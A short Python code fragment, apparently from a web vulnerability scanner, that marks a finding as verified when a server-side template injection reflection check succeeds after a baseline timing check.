        if baseline.elapsed < 0:
            return verified
        if self._verify_template_reflection(result, baseline, headers, method):
            return self._set_status(result, VerificationStatus.VERIFIED, "Verified by ssti_reflection.")
        return verified
